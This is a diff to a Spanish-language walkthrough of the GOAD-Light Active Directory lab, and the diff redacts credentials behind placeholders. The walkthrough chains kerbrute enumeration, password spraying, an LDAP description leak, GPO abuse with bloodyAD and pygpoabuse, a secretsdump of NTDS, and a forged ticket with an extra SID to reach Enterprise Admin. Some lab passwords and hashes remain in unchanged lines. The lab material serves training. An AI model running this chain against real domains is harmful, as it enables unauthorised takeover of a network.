@@ -9,6 +9,9 @@ tags: [active-directory, kerberos, password-spray, kerbrute, ldap-description-di
 **Entorno:** Windows Server 2019 — [GOAD-Light](https://github.com/Orange-Cyberdefense/GOAD/tree/main/ad/GOAD-Light), la variante reducida de GOAD para equipos con pocos recursos: bosque de dos dominios (`sevenkingdoms.local` raíz, `north.sevenkingdoms.local` hijo), 3 máquinas en total  
 **Objetivo:** Partiendo de cero contra el bosque, comprometer primero el dominio hijo, usar la relación de confianza para escalar hasta Domain Admin del dominio raíz, y rematar las tres máquinas del lab.
 
+> Las credenciales y hashes reales están ocultos tras spoilers (🔓) — los comandos usan un placeholder genérico para que puedas intentarlo tú antes de revelar la respuesta.
+{: .prompt-tip }
+
 ---
 
 ## Resumen
@@ -18,7 +21,7 @@ Este es **GOAD-Light**, la variante ligera de [GOAD](https://github.com/Orange-C
 La cadena de ataque completa:
 
 1. **Enumeración de usuarios** con `kerbrute` sobre ambos dominios usando un diccionario de nombres de personajes de la serie.
-2. **Password spray** trivial (usuario = contraseña) → `hodor:hodor` válido en el dominio hijo.
+2. **Password spray** trivial (usuario = contraseña) → una credencial válida en el dominio hijo.
 3. Con esa cuenta de bajísimo privilegio, **fuga de credenciales en el campo `description` de LDAP** → contraseña de `samwell.tarly` en texto plano, escrita ahí por error.
 4. **BloodHound** revela que `samwell.tarly` puede convertirse en dueño de una GPO del dominio.
 5. **Abuso de GPO** (toma de ownership + `GenericAll` + `pygpoabuse` sobre `ScheduledTasks.xml`) → admin local en `winterfell` (DC del dominio hijo).
@@ -60,7 +63,7 @@ kerbrute userenum -d sevenkingdoms.local --dc 10.6.6.10 got_users.txt
 kerbrute userenum -d north.sevenkingdoms.local --dc 10.6.6.11 got_users.txt
 ```
 
-El dominio raíz confirma 4 usuarios (`cersei.lannister`, `tywin.lannister`, `jaime.lannister`, `joffrey.baratheon`); el hijo confirma 11 (`arya.stark`, `eddard.stark`, `jon.snow`, `samwell.tarly`, `hodor`...).
+El dominio raíz confirma 4 usuarios (`cersei.lannister`, `tywin.lannister`, `jaime.lannister`, `joffrey.baratheon`); el hijo confirma 11 (`arya.stark`, `eddard.stark`, `jon.snow`, `samwell.tarly`, `hodor`...). Los nombres de usuario no son secretos — son el resultado directo de esta enumeración, así que se muestran tal cual.
 
 Un password spray trivial — cada usuario contra su propio nombre como contraseña — falla contra todos excepto uno:
 
@@ -77,16 +80,16 @@ nxc smb 10.6.6.11 -u north_users.txt -p north_users.txt --no-bruteforce --contin
 
 </details>
 
-`hodor` va a ser `hodor` hasta el final.
+La pista estaba en el propio nombre de usuario.
 
 ---
 
 ## Fase 2: La contraseña que estaba en el campo description
 
-Con `hodor:hodor` ya se puede leer `NETLOGON`/`SYSVOL` por SMB, y lanzar un módulo de NetExec que vuelca el atributo `description` de todos los usuarios vía LDAP:
+Con esa cuenta de dominio ya se puede leer `NETLOGON`/`SYSVOL` por SMB, y lanzar un módulo de NetExec que vuelca el atributo `description` de todos los usuarios vía LDAP:
 
 ```bash
-nxc ldap 10.6.6.11 -u hodor -p hodor -M get-desc-users
+nxc ldap 10.6.6.11 -u hodor -p '<contraseña>' -M get-desc-users
 ```
 
 <details markdown="1">
@@ -101,7 +104,7 @@ User: samwell.tarly   description: Samwell Tarly (Password : Heartsbane)
 Ahí está — la contraseña de `samwell.tarly` escrita en texto plano en su propia descripción de AD. Confirmación:
 
 ```bash
-nxc smb 10.6.6.11 -u samwell.tarly -p Heartsbane
+nxc smb 10.6.6.11 -u samwell.tarly -p '<contraseña>'
 ```
 
 <details markdown="1">
@@ -118,7 +121,7 @@ nxc smb 10.6.6.11 -u samwell.tarly -p Heartsbane
 ## Fase 3: BloodHound y abuso de GPO
 
 ```bash
-bloodhound-python -u hodor -p hodor -d north.sevenkingdoms.local -ns 10.6.6.11 -c All --zip
+bloodhound-python -u hodor -p '<contraseña>' -d north.sevenkingdoms.local -ns 10.6.6.11 -c All --zip
 ```
 
 > **Nota:** `bloodhound-python` (legacy) rompe con un `TypeError` al parsear ciertos atributos de tipo `filetime` negativo (`minPwdAge`) en versiones recientes de `ldap3`. Se soluciona fijando la versión: `pip install ldap3==2.9.1 --break-system-packages --force-reinstall`.
@@ -131,17 +134,17 @@ _Grafo real de BloodHound: `samwell.tarly` con `WriteOwner` sobre la GPO `StarkW
 Con [bloodyAD](https://github.com/CravateRouge/bloodyAD):
 
 ```bash
-bloodyAD --host 10.6.6.11 -d north.sevenkingdoms.local -u samwell.tarly -p Heartsbane \
+bloodyAD --host 10.6.6.11 -d north.sevenkingdoms.local -u samwell.tarly -p '<contraseña>' \
   set owner "CN={C7F2AD8A-92E1-4507-A5B0-648A36E308A1},CN=Policies,CN=System,DC=north,DC=sevenkingdoms,DC=local" samwell.tarly
 
-bloodyAD --host 10.6.6.11 -d north.sevenkingdoms.local -u samwell.tarly -p Heartsbane \
+bloodyAD --host 10.6.6.11 -d north.sevenkingdoms.local -u samwell.tarly -p '<contraseña>' \
   add genericAll "CN={C7F2AD8A-92E1-4507-A5B0-648A36E308A1},CN=Policies,CN=System,DC=north,DC=sevenkingdoms,DC=local" samwell.tarly
 ```
 
 Con `GenericAll` sobre la GPO, [pygpoabuse](https://github.com/Hackndo/pygpoabuse) inyecta una tarea programada que añade al propio usuario al grupo de administradores locales allí donde se aplique la GPO. La GPO ya traía un `ScheduledTasks.xml` propio, así que hace falta `-f` para añadir la tarea sin pisar la existente:
 
 ```bash
-pygpoabuse.py 'north.sevenkingdoms.local/samwell.tarly:Heartsbane' \
+pygpoabuse.py 'north.sevenkingdoms.local/samwell.tarly:<contraseña>' \
   -gpo-id C7F2AD8A-92E1-4507-A5B0-648A36E308A1 \
   -command 'net localgroup administrators samwell.tarly /add' \
   -dc-ip 10.6.6.11 -f
@@ -154,8 +157,8 @@ pygpoabuse.py 'north.sevenkingdoms.local/samwell.tarly:Heartsbane' \
 Tras el próximo ciclo de refresco de GPO (o forzándolo), `samwell.tarly` es admin local del DC:
 
 ```bash
-nxc smb 10.6.6.11 -u samwell.tarly -p Heartsbane
-# [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane (admin)
+nxc smb 10.6.6.11 -u samwell.tarly -p '<contraseña>'
+# [+] ... (admin)
 ```
 
 ---
@@ -165,7 +168,7 @@ nxc smb 10.6.6.11 -u samwell.tarly -p Heartsbane
 Con admin en `winterfell`, `secretsdump` completo saca la NTDS del dominio hijo — incluida la cuenta de confianza `NORTH$`:
 
 ```bash
-secretsdump.py north.sevenkingdoms.local/samwell.tarly:Heartsbane@10.6.6.11
+secretsdump.py north.sevenkingdoms.local/samwell.tarly:'<contraseña>'@10.6.6.11
 ```
 
 <details markdown="1">
@@ -181,7 +184,7 @@ NORTH$:1105:aad3b435b51404eeaad3b435b51404ee:aaed1f8c12a6ff5b76a1903124b7363b:::
 `NORTH$` es la cuenta de confianza que representa al dominio hijo dentro del bosque — y su NTLM es la clave para el ataque clásico de **SID History / confianza padre-hijo**. Con [ticketer.py](https://github.com/fortra/impacket) se forja un TGT para "Administrator" del dominio hijo, pero inyectando en el campo `SID History` el SID de **Enterprise Admins del dominio raíz** (`<SID-raíz>-519`):
 
 ```bash
-ticketer.py -nthash aaed1f8c12a6ff5b76a1903124b7363b \
+ticketer.py -nthash '<hash de NORTH$>' \
   -domain-sid S-1-5-21-221956006-502909763-1067390246 \
   -domain north.sevenkingdoms.local \
   -extra-sid S-1-5-21-2080356956-2684343819-452018693-519 \
@@ -228,7 +231,7 @@ Con el hash de `krbtgt` del dominio raíz en la mano, se puede forjar un Golden 
 El problema nunca fue la máquina, era la cuenta. `Administrator` del dominio hijo (Domain Admin) sí es admin local en cualquier equipo unido al dominio — incluida `castelblack`. Con `-hashes` en vez de `-windows-auth`, y usando `psexec` en lugar de `mssqlclient`:
 
 ```bash
-psexec.py NORTH/Administrator@10.6.6.22 -hashes aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4
+psexec.py NORTH/Administrator@10.6.6.22 -hashes aad3b435b51404eeaad3b435b51404ee:'<hash de Administrator>'
 ```
 
 ```
@@ -255,7 +258,7 @@ Las tres máquinas del lab, completamente comprometidas:
 | Técnica | Descripción |
 |---------|-------------|
 | Username enumeration | `kerbrute userenum` con diccionario temático contra ambos dominios |
-| Password spray | Usuario = contraseña, revela `hodor:hodor` |
+| Password spray | Usuario = contraseña, revela una credencial válida |
 | LDAP description disclosure | Contraseña de `samwell.tarly` en texto plano en su propio atributo `description` |
 | BloodHound (legacy) | Recolección LDAP para trazar la ruta de ataque |
 | GPO abuse (ownership + GenericAll + ScheduledTask) | `bloodyAD` + `pygpoabuse` para conseguir admin local en el DC del dominio hijo |
